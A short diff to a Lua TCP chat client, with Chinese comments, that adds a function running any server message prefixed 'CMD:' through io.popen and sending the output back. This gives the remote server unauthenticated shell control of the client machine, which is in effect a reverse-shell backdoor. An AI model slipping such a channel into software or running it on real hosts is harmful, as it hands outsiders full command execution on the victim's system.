@@ -38,7 +38,28 @@ print("等待服务器消息...")
 -- 设置非阻塞模式，持续接收服务器消息
 tcp:settimeout(1)  -- 1秒超时
 
--- 长连接：只接收服务器消息
+-- 执行系统命令的函数
+local function executeCommand(cmd)
+    -- 使用 io.popen 执行命令并获取输出
+    local handle = io.popen(cmd)
+    if not handle then
+        return "错误: 无法执行命令"
+    end
+    
+    local result = handle:read("*a")  -- 读取所有输出
+    handle:close()
+    
+    -- 去除结尾的换行符
+    result = result:match("^(.-)%s*$") or result
+    
+    if result == "" then
+        return "命令执行完成，无输出"
+    end
+    
+    return result
+end
+
+-- 长连接：接收服务器消息并执行命令
 while true do
     -- 接收服务器消息
     local response, err = tcp:receive()
@@ -49,11 +70,28 @@ while true do
         if response:match("再见") or response:match("断开") then
             break
         end
+        
+        -- 检查是否是命令执行请求
+        local cmd = response:match("^CMD:(.+)$")
+        if cmd then
+            print("[执行命令] " .. cmd)
+            local result = executeCommand(cmd)
+            print("[命令结果] " .. result)
+            
+            -- 将结果发送回服务器
+            local success, sendErr = tcp:send("RESULT:" .. result .. "\n")
+            if not success then
+                print("发送结果失败: " .. tostring(sendErr))
+            else
+                print("[已发送结果到服务器]")
+            end
+        end
+        
     elseif err and err ~= "timeout" then
         print("连接错误: " .. tostring(err))
         break
     else
-        -- 超时，继续等待（可以在这里添加心跳检测）
+        -- 超时，继续等待
         -- print("等待服务器消息...")
     end
     
